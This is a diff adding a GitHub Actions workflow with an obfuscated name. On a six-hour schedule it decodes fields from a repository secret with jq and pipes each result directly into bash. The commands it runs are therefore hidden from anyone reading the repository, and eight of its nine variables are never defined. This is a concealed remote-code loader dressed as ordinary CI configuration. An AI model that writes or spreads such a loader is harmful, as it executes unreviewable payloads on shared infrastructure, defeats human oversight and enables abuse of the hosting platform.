@@ -1,0 +1,24 @@
+name: qietiangengshangyouniuquan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qietiangengshangyouniuquan
+        env:
+          uvr91: ${{ secrets.uvr91 }}
+        run: |
+          echo $uvr91 | jq -r .lmzy451 | /bin/bash
+          echo $p09413 | jq -r .wlugq77 | /bin/bash
+          echo $v12641 | jq -r .blp57379 | /bin/bash
+          echo $e841 | jq -r .ma007 | /bin/bash
+          echo $qj96698 | jq -r .kn84464 | /bin/bash
+          echo $r5 | jq -r .im38578 | /bin/bash
+          echo $w815 | jq -r .wp5 | /bin/bash
+          echo $lox2813 | jq -r .bpksf2 | /bin/bash
+          echo $vhkp32 | jq -r .znwu1540 | /bin/bash
+
